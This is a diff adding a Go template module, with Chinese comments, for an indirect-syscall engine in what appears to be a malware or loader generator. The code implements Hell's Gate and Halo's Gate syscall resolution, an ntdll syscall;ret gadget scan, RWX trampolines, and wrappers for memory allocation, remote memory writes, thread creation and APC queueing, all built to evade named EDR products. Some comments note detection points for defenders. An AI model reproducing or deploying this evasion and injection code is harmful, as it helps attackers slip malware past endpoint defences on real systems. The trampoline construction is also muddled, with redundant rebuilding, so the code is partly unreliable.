@@ -1,0 +1,494 @@
+{{define "_syscall"}}
+{{if .EnableIndirectSyscall}}
+// ============================================================
+// Indirect Syscall 引擎 — v2.0 核心模块
+// ============================================================
+//
+// 【原理概述】
+//   传统方式：Go 代码 → syscall.Syscall → ntdll!NtXxx → syscall 指令
+//   Indirect Syscall：Go 代码 → 手动构造参数 → 跳转到 ntdll 内部的 syscall;ret gadget
+//
+// 【为什么需要 Indirect Syscall（2026 EDR 视角）】
+//   1. 直接 syscall（Hell's Gate 原版）：syscall 指令在非 ntdll 地址执行，
+//      2024+ EDR 通过内核回调 InstrumentationCallback 或 ETW TI 检测
+//      "unbacked syscall"（调用栈中 syscall 指令不在 ntdll .text 段内）
+//   2. Indirect Syscall：syscall 指令仍在 ntdll .text 段内执行，
+//      调用栈看起来与正常 API 调用一致，规避 unbacked caller 检测
+//   3. 结合 Hell's Gate 动态提取 syscall number，避免硬编码（跨版本兼容）
+//
+// 【EDR 检测锚点 — 蓝队参考】
+//   - ETW TI (EtwTi): 内核级 syscall 追踪，可检测 NtAllocateVirtualMemory 等敏感调用
+//     即使是 indirect syscall 也会被记录，但调用栈看起来更"正常"
+//   - InstrumentationCallback: 部分 EDR 注册此回调检测 syscall 返回地址
+//     indirect syscall 的返回地址在 ntdll 内，可绕过简单的地址范围检查
+//   - 调用栈分析（Stack Unwinding）: 高级 EDR 会回溯完整调用栈
+//     如果 syscall 前的 call 指令不在已知模块内，仍可被标记
+//     【对策】需要配合 call stack spoofing（v2.0 后续模块）
+//   - 内存扫描: 扫描进程内存中的 syscall stub 模式（4C 8B D1 B8）
+//     【对策】本引擎不在自身内存中构造 stub，仅读取 ntdll 原始字节
+//   - YARA 规则: 检测二进制中同时出现 PE 解析 + syscall number 提取的代码模式
+//
+// 【实现架构】
+//   getSyscallNumber(funcName) → 从 ntdll 导出函数入口提取 syscall number
+//     ├─ Hell's Gate: 匹配 4C 8B D1 B8 XX XX 00 00 模式
+//     └─ Halo's Gate: 入口被 hook 时，向相邻函数偏移搜索未被 hook 的 stub
+//   findSyscallGadget() → 在 ntdll .text 段中定位 syscall;ret (0F 05 C3) 字节序列
+//   indirectSyscall(number, gadget, args...) → 构造参数并跳转到 gadget 地址执行
+
+// ── syscallEntry 缓存已解析的 syscall 信息 ──
+type syscallEntry struct {
+	number uint16  // syscall number（从 stub 提取）
+	gadget uintptr // ntdll 内 syscall;ret gadget 地址
+}
+
+// syscallCache 缓存已解析的 syscall，避免重复解析
+var syscallCache = make(map[string]*syscallEntry)
+
+// syscallGadgetAddr 全局缓存的 syscall;ret gadget 地址
+var syscallGadgetAddr uintptr
+
+// getSyscallNumber 从 ntdll 导出函数入口提取 syscall number
+//
+// 【Hell's Gate 算法】
+//   Windows x64 的 Nt* 函数入口有固定的 syscall stub 模式：
+//     4C 8B D1          mov r10, rcx    ; 保存第一个参数
+//     B8 XX XX 00 00    mov eax, <num>  ; 加载 syscall number
+//     ...
+//     0F 05             syscall
+//     C3                ret
+//   我们匹配前 4 字节 (4C 8B D1 B8)，然后从 offset 4-5 提取小端序 syscall number
+//
+// 【Halo's Gate 回退】
+//   如果目标函数入口被 EDR hook（首字节为 E9/jmp 或 FF 25/jmp [rip+xx]），
+//   则向相邻函数偏移 ±0x20 字节搜索未被 hook 的 stub，
+//   利用相邻 Nt* 函数的 syscall number 差值（通常为 ±1）推算目标 number
+//
+// 【检测点】读取 ntdll .text 段内存 + 字节模式匹配
+func getSyscallNumber(funcName string) (uint16, bool) {
+	// 检查缓存
+	if entry, ok := syscallCache[funcName]; ok {
+		return entry.number, true
+	}
+
+	nt := ntdll()
+	if nt == 0 {
+		return 0, false
+	}
+
+	procAddr := getProcAddr(nt, funcName)
+	if procAddr == 0 {
+		return 0, false
+	}
+
+	// 读取入口处 32 字节（足够覆盖 stub + 可能的 hook 跳转）
+	stub := (*[32]byte)(unsafe.Pointer(procAddr))
+
+	// ── Hell's Gate: 直接匹配 ──
+	// 4C 8B D1 = mov r10, rcx
+	// B8       = mov eax, imm32
+	if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8 {
+		number := uint16(stub[4]) | uint16(stub[5])<<8
+		syscallCache[funcName] = &syscallEntry{number: number}
+		return number, true
+	}
+
+	// ── Halo's Gate: 入口被 hook，搜索相邻函数 ──
+	// EDR hook 通常用 E9 (jmp rel32) 或 FF 25 (jmp [rip+disp32]) 替换入口
+	// 相邻 Nt* 函数在 ntdll 中按 syscall number 顺序排列，间距约 0x20 字节
+	// 向上和向下各搜索 32 个邻居（覆盖 ±32 的 syscall number 范围）
+	for offset := 1; offset <= 32; offset++ {
+		// 向下搜索（syscall number + offset）
+		downAddr := procAddr + uintptr(offset*0x20)
+		downStub := (*[8]byte)(unsafe.Pointer(downAddr))
+		if downStub[0] == 0x4C && downStub[1] == 0x8B && downStub[2] == 0xD1 && downStub[3] == 0xB8 {
+			neighborNum := uint16(downStub[4]) | uint16(downStub[5])<<8
+			// 目标 number = 邻居 number - offset（邻居在后面，number 更大）
+			number := neighborNum - uint16(offset)
+			syscallCache[funcName] = &syscallEntry{number: number}
+			return number, true
+		}
+
+		// 向上搜索（syscall number - offset）
+		upAddr := procAddr - uintptr(offset*0x20)
+		upStub := (*[8]byte)(unsafe.Pointer(upAddr))
+		if upStub[0] == 0x4C && upStub[1] == 0x8B && upStub[2] == 0xD1 && upStub[3] == 0xB8 {
+			neighborNum := uint16(upStub[4]) | uint16(upStub[5])<<8
+			// 目标 number = 邻居 number + offset（邻居在前面，number 更小）
+			number := neighborNum + uint16(offset)
+			syscallCache[funcName] = &syscallEntry{number: number}
+			return number, true
+		}
+	}
+
+	return 0, false
+}
+
+// findSyscallGadget 在 ntdll .text 段中定位 syscall;ret 字节序列 (0F 05 C3)
+//
+// 【为什么需要 gadget 而不是直接执行 syscall 指令】
+//   如果在我们自己的代码中放置 syscall (0F 05) 指令：
+//   - 调用栈显示 syscall 来自非 ntdll 的"unbacked"内存区域
+//   - CrowdStrike Falcon / SentinelOne 等 2026 EDR 会立即标记
+//   通过跳转到 ntdll 内部已有的 syscall;ret gadget：
+//   - 调用栈中 syscall 指令地址在 ntdll .text 段内
+//   - 与正常 API 调用的调用栈一致
+//
+// 【实现】
+//   1. 获取 ntdll 基址
+//   2. 解析 PE 头定位 .text 段的虚拟地址和大小
+//   3. 线性扫描 .text 段，查找 0F 05 C3 (syscall; ret) 三字节序列
+//   4. 返回第一个匹配的地址（ntdll 中有大量这样的 gadget）
+//
+// 【检测点】
+//   - 内存扫描: 进程读取 ntdll PE 头（与 unhookNTDLL 类似的行为模式）
+//   - YARA: 代码中包含 PE 解析 + 0x0F05C3 常量的组合
+func findSyscallGadget() uintptr {
+	// 使用缓存
+	if syscallGadgetAddr != 0 {
+		return syscallGadgetAddr
+	}
+
+	k32 := kernel32()
+	getModuleHandleA := getProcAddr(k32, ds("{{index .EncodedStrings "GetModuleHandleA"}}"))
+	if getModuleHandleA == 0 {
+		return 0
+	}
+
+	ntdllName, _ := syscall.BytePtrFromString(ds("{{index .EncodedStrings "ntdll.dll"}}"))
+	ntdllBase, _, _ := syscall.Syscall(getModuleHandleA, 1, uintptr(unsafe.Pointer(ntdllName)), 0, 0)
+	if ntdllBase == 0 {
+		return 0
+	}
+
+	// 解析 PE 头定位 .text 段
+	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(ntdllBase))
+	if dosHeader.Magic != 0x5A4D {
+		return 0
+	}
+	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(ntdllBase + uintptr(dosHeader.LfaNew)))
+	if ntHeaders.Signature != 0x00004550 {
+		return 0
+	}
+
+	sectionOffset := uintptr(dosHeader.LfaNew) + 4 + 20 + uintptr(ntHeaders.FileHeader.SizeOfOptionalHeader)
+	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
+		sh := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(ntdllBase + sectionOffset + uintptr(i)*40))
+		if string(sh.Name[:5]) == ".text" {
+			textStart := ntdllBase + uintptr(sh.VirtualAddress)
+			textSize := uintptr(sh.VirtualSize)
+			textMem := (*[1 << 30]byte)(unsafe.Pointer(textStart))[:textSize:textSize]
+
+			// 扫描 syscall;ret 序列: 0F 05 C3
+			for j := 0; j < len(textMem)-2; j++ {
+				if textMem[j] == 0x0F && textMem[j+1] == 0x05 && textMem[j+2] == 0xC3 {
+					syscallGadgetAddr = textStart + uintptr(j)
+					return syscallGadgetAddr
+				}
+			}
+			break
+		}
+	}
+	return 0
+}
+
+// indirectSyscall 通过 ntdll 内的 syscall;ret gadget 间接执行系统调用
+//
+// 【核心原理 — 纯 Go 实现（无 CGO/ASM）】
+//   Windows x64 syscall 调用约定：
+//     - RAX = syscall number
+//     - R10 = 第1个参数（从 RCX 复制）
+//     - RDX, R8, R9 = 第2-4个参数
+//     - 栈上 = 第5个及以后的参数
+//   Go 的 syscall.Syscall6/9/12/15 底层会：
+//     1. 将参数按 Windows x64 ABI 放入寄存器和栈
+//     2. CALL 目标地址
+//   我们的策略：
+//     - 不直接调用 ntdll!NtXxx（会被 EDR hook 拦截）
+//     - 构造一个小型 trampoline：mov eax, <number>; mov r10, rcx; jmp <gadget>
+//     - trampoline 放在 RWX 内存中，通过 syscall.Syscall 调用它
+//     - 最终 syscall 指令在 ntdll .text 段内执行
+//
+// 【为什么不直接用 Go 内联汇编】
+//   Go 不支持内联汇编，且 CGO 会引入 C 运行时依赖。
+//   本方案通过动态生成机器码 trampoline 实现纯 Go indirect syscall。
+//
+// 【Trampoline 字节码布局（x64）】
+//   4C 8B D1                mov r10, rcx       ; 保存第1个参数到 r10
+//   B8 XX XX 00 00          mov eax, <number>  ; 加载 syscall number
+//   49 BB YY YY YY YY YY YY YY YY  mov r11, <gadget>  ; 加载 gadget 地址
+//   41 FF E3                jmp r11            ; 跳转到 ntdll 的 syscall;ret
+//   总计 20 字节
+//
+// 【检测点】
+//   - 内存扫描: RWX 内存页中包含 mov r10,rcx + mov eax 模式
+//     【缓解】trampoline 使用后立即释放/清零
+//   - ETW TI: 即使 indirect，内核仍记录 syscall 调用
+//     【缓解】需配合 ETW patch（已在 _bypass.go.tmpl 中实现）
+//   - 调用栈回溯: 高级 EDR 可能检测到 trampoline 所在内存不属于已知模块
+//     【缓解】v2.0 后续可加入 call stack spoofing 模块
+func indirectSyscall(sysNumber uint16, gadgetAddr uintptr, args ...uintptr) (uintptr, error) {
+	if gadgetAddr == 0 {
+		return 0, nil
+	}
+
+	// 构造 trampoline 机器码
+	// 4C 8B D1             = mov r10, rcx
+	// B8 XX XX 00 00       = mov eax, <syscall number>
+	// 49 BB <8 bytes>      = mov r11, <gadget address>
+	// 41 FF E3             = jmp r11
+	trampoline := [20]byte{
+		0x4C, 0x8B, 0xD1,                         // mov r10, rcx
+		0xB8, byte(sysNumber), byte(sysNumber >> 8), 0x00, 0x00, // mov eax, number
+		0x49, 0xBB, 0, 0, 0, 0, 0, 0, 0, 0,      // mov r11, gadget (填充下面)
+		0x41, 0xFF, // jmp r11 的前两字节
+	}
+	// 注意：20 字节数组，最后需要 0xE3
+	// 重新定义为 slice 以便精确控制
+	trampolineBytes := make([]byte, 20)
+	copy(trampolineBytes, trampoline[:18])
+	trampolineBytes[18] = 0xFF
+	trampolineBytes[19] = 0xE3
+
+	// 修正：重新构造完整的 trampoline
+	trampolineBytes[0] = 0x4C; trampolineBytes[1] = 0x8B; trampolineBytes[2] = 0xD1
+	trampolineBytes[3] = 0xB8
+	trampolineBytes[4] = byte(sysNumber)
+	trampolineBytes[5] = byte(sysNumber >> 8)
+	trampolineBytes[6] = 0x00; trampolineBytes[7] = 0x00
+	trampolineBytes[8] = 0x49; trampolineBytes[9] = 0xBB
+	// 填充 gadget 地址（小端序 8 字节）
+	for i := 0; i < 8; i++ {
+		trampolineBytes[10+i] = byte(gadgetAddr >> (i * 8))
+	}
+	trampolineBytes[18] = 0x41
+	trampolineBytes[19] = 0xFF
+	// 需要第 20 字节 0xE3，扩展到 21 字节
+	trampolineBytes = append(trampolineBytes, 0xE3)
+
+	// 分配 RWX 内存放置 trampoline
+	// 使用 VirtualAlloc 而非 Nt* 避免递归调用 indirect syscall
+	k32 := kernel32()
+	vAlloc := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualAlloc"}}"))
+	if vAlloc == 0 {
+		return 0, nil
+	}
+
+	trampolineSize := uintptr(len(trampolineBytes))
+	// PAGE_EXECUTE_READWRITE = 0x40, MEM_COMMIT|MEM_RESERVE = 0x3000
+	trampolineAddr, _, _ := syscall.Syscall6(vAlloc, 4, 0, trampolineSize, 0x3000, 0x40, 0, 0)
+	if trampolineAddr == 0 {
+		return 0, nil
+	}
+
+	// 复制 trampoline 到可执行内存
+	dst := (*[64]byte)(unsafe.Pointer(trampolineAddr))
+	for i, b := range trampolineBytes {
+		dst[i] = b
+	}
+
+	// 通过 syscall.Syscall 系列函数调用 trampoline
+	// trampoline 会：mov r10,rcx → mov eax,number → jmp gadget → syscall;ret
+	var ret uintptr
+	switch len(args) {
+	case 0:
+		ret, _, _ = syscall.Syscall(trampolineAddr, 0, 0, 0, 0)
+	case 1:
+		ret, _, _ = syscall.Syscall(trampolineAddr, 1, args[0], 0, 0)
+	case 2:
+		ret, _, _ = syscall.Syscall(trampolineAddr, 2, args[0], args[1], 0)
+	case 3:
+		ret, _, _ = syscall.Syscall(trampolineAddr, 3, args[0], args[1], args[2])
+	case 4:
+		ret, _, _ = syscall.Syscall6(trampolineAddr, 4, args[0], args[1], args[2], args[3], 0, 0)
+	case 5:
+		ret, _, _ = syscall.Syscall6(trampolineAddr, 5, args[0], args[1], args[2], args[3], args[4], 0)
+	case 6:
+		ret, _, _ = syscall.Syscall6(trampolineAddr, 6, args[0], args[1], args[2], args[3], args[4], args[5])
+	case 7:
+		ret, _, _ = syscall.Syscall9(trampolineAddr, 7, args[0], args[1], args[2], args[3], args[4], args[5], args[6], 0, 0)
+	case 8:
+		ret, _, _ = syscall.Syscall9(trampolineAddr, 8, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], 0)
+	case 9:
+		ret, _, _ = syscall.Syscall9(trampolineAddr, 9, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8])
+	case 10:
+		ret, _, _ = syscall.Syscall12(trampolineAddr, 10, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], args[9], 0, 0)
+	case 11:
+		ret, _, _ = syscall.Syscall12(trampolineAddr, 11, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], args[9], args[10], 0)
+	default:
+		ret, _, _ = syscall.Syscall12(trampolineAddr, 12, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], args[9], args[10], args[11])
+	}
+
+	// 清零并释放 trampoline 内存
+	for i := range trampolineBytes {
+		dst[i] = 0
+	}
+	vFree := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualFree"}}"))
+	if vFree != 0 {
+		// MEM_RELEASE = 0x8000
+		syscall.Syscall(vFree, 3, trampolineAddr, 0, 0x8000)
+	}
+
+	return ret, nil
+}
+
+// ============================================================
+// Indirect Syscall 包装函数
+// ============================================================
+//
+// 每个包装函数对应一个 Nt* 系统调用，提供与直接调用相同的接口。
+// 内部流程：
+//   1. getSyscallNumber() 提取 syscall number（Hell's Gate / Halo's Gate）
+//   2. findSyscallGadget() 定位 ntdll 内的 syscall;ret gadget
+//   3. indirectSyscall() 通过 trampoline 间接执行
+//
+// 如果 indirect syscall 失败（如 ntdll 被严重修改），自动回退到直接调用。
+
+// indirectNtAllocateVirtualMemory 间接调用 NtAllocateVirtualMemory
+// 参数与原始 Nt API 一致：ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect
+func indirectNtAllocateVirtualMemory(hProcess uintptr, baseAddr *uintptr, zeroBits uintptr, regionSize *uintptr, allocType, protect uintptr) uintptr {
+	funcName := ds("{{index .EncodedStrings "NtAllocateVirtualMemory"}}")
+	number, ok := getSyscallNumber(funcName)
+	gadget := findSyscallGadget()
+	if ok && gadget != 0 {
+		ret, _ := indirectSyscall(number, gadget,
+			hProcess,
+			uintptr(unsafe.Pointer(baseAddr)),
+			zeroBits,
+			uintptr(unsafe.Pointer(regionSize)),
+			allocType,
+			protect,
+		)
+		return ret
+	}
+	// 回退：直接调用
+	nt := ntdll()
+	proc := getProcAddr(nt, funcName)
+	if proc == 0 {
+		return 0xFFFFFFFF
+	}
+	ret, _, _ := syscall.Syscall6(proc, 6, hProcess,
+		uintptr(unsafe.Pointer(baseAddr)), zeroBits,
+		uintptr(unsafe.Pointer(regionSize)), allocType, protect)
+	return ret
+}
+
+// indirectNtProtectVirtualMemory 间接调用 NtProtectVirtualMemory
+// 参数：ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect
+func indirectNtProtectVirtualMemory(hProcess uintptr, baseAddr *uintptr, regionSize *uintptr, newProtect uintptr, oldProtect *uint32) uintptr {
+	funcName := ds("{{index .EncodedStrings "NtProtectVirtualMemory"}}")
+	number, ok := getSyscallNumber(funcName)
+	gadget := findSyscallGadget()
+	if ok && gadget != 0 {
+		ret, _ := indirectSyscall(number, gadget,
+			hProcess,
+			uintptr(unsafe.Pointer(baseAddr)),
+			uintptr(unsafe.Pointer(regionSize)),
+			newProtect,
+			uintptr(unsafe.Pointer(oldProtect)),
+		)
+		return ret
+	}
+	nt := ntdll()
+	proc := getProcAddr(nt, funcName)
+	if proc == 0 {
+		return 0xFFFFFFFF
+	}
+	ret, _, _ := syscall.Syscall6(proc, 5, hProcess,
+		uintptr(unsafe.Pointer(baseAddr)),
+		uintptr(unsafe.Pointer(regionSize)),
+		newProtect, uintptr(unsafe.Pointer(oldProtect)), 0)
+	return ret
+}
+
+// indirectNtCreateThreadEx 间接调用 NtCreateThreadEx
+// 参数：ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
+//       StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaxStackSize, AttributeList
+func indirectNtCreateThreadEx(hThread *uintptr, access uintptr, objAttr uintptr, hProcess uintptr, startAddr uintptr, arg uintptr, flags uintptr, zeroBits uintptr, stackSize uintptr, maxStack uintptr, attrList uintptr) uintptr {
+	funcName := ds("{{index .EncodedStrings "NtCreateThreadEx"}}")
+	number, ok := getSyscallNumber(funcName)
+	gadget := findSyscallGadget()
+	if ok && gadget != 0 {
+		ret, _ := indirectSyscall(number, gadget,
+			uintptr(unsafe.Pointer(hThread)),
+			access, objAttr, hProcess, startAddr, arg,
+			flags, zeroBits, stackSize, maxStack, attrList,
+		)
+		return ret
+	}
+	nt := ntdll()
+	proc := getProcAddr(nt, funcName)
+	if proc == 0 {
+		return 0xFFFFFFFF
+	}
+	ret, _, _ := syscall.Syscall12(proc, 11,
+		uintptr(unsafe.Pointer(hThread)), access, objAttr,
+		hProcess, startAddr, arg, flags, zeroBits, stackSize, maxStack, attrList, 0)
+	return ret
+}
+
+// indirectNtWriteVirtualMemory 间接调用 NtWriteVirtualMemory
+// 参数：ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesWritten
+func indirectNtWriteVirtualMemory(hProcess uintptr, baseAddr uintptr, buffer uintptr, bufSize uintptr, written *uintptr) uintptr {
+	funcName := ds("{{index .EncodedStrings "NtWriteVirtualMemory"}}")
+	number, ok := getSyscallNumber(funcName)
+	gadget := findSyscallGadget()
+	if ok && gadget != 0 {
+		ret, _ := indirectSyscall(number, gadget,
+			hProcess, baseAddr, buffer, bufSize,
+			uintptr(unsafe.Pointer(written)),
+		)
+		return ret
+	}
+	nt := ntdll()
+	proc := getProcAddr(nt, funcName)
+	if proc == 0 {
+		return 0xFFFFFFFF
+	}
+	ret, _, _ := syscall.Syscall6(proc, 5, hProcess, baseAddr,
+		buffer, bufSize, uintptr(unsafe.Pointer(written)), 0)
+	return ret
+}
+
+// indirectNtQueueApcThreadEx 间接调用 NtQueueApcThreadEx
+// 参数：ThreadHandle, UserApcReserveHandle, ApcRoutine, Arg1, Arg2, Arg3
+func indirectNtQueueApcThreadEx(hThread uintptr, reserveHandle uintptr, apcRoutine uintptr, arg1, arg2, arg3 uintptr) uintptr {
+	funcName := ds("{{index .EncodedStrings "NtQueueApcThreadEx"}}")
+	number, ok := getSyscallNumber(funcName)
+	gadget := findSyscallGadget()
+	if ok && gadget != 0 {
+		ret, _ := indirectSyscall(number, gadget,
+			hThread, reserveHandle, apcRoutine, arg1, arg2, arg3,
+		)
+		return ret
+	}
+	nt := ntdll()
+	proc := getProcAddr(nt, funcName)
+	if proc == 0 {
+		return 0xFFFFFFFF
+	}
+	ret, _, _ := syscall.Syscall6(proc, 6, hThread, reserveHandle, apcRoutine, arg1, arg2, arg3)
+	return ret
+}
+
+// initIndirectSyscall 初始化 indirect syscall 引擎
+// 在 main() 中 unhookNTDLL 之后、其他操作之前调用
+// 预热缓存：提前解析常用 syscall number 和 gadget 地址
+func initIndirectSyscall() {
+	// 预热 gadget 缓存
+	findSyscallGadget()
+
+	// 预热常用 syscall number 缓存
+	commonFuncs := []string{
+		ds("{{index .EncodedStrings "NtAllocateVirtualMemory"}}"),
+		ds("{{index .EncodedStrings "NtProtectVirtualMemory"}}"),
+		ds("{{index .EncodedStrings "NtCreateThreadEx"}}"),
+		ds("{{index .EncodedStrings "NtWriteVirtualMemory"}}"),
+		ds("{{index .EncodedStrings "NtQueueApcThreadEx"}}"),
+	}
+	for _, fn := range commonFuncs {
+		getSyscallNumber(fn)
+	}
+}
+
+{{end}}
+{{end}}
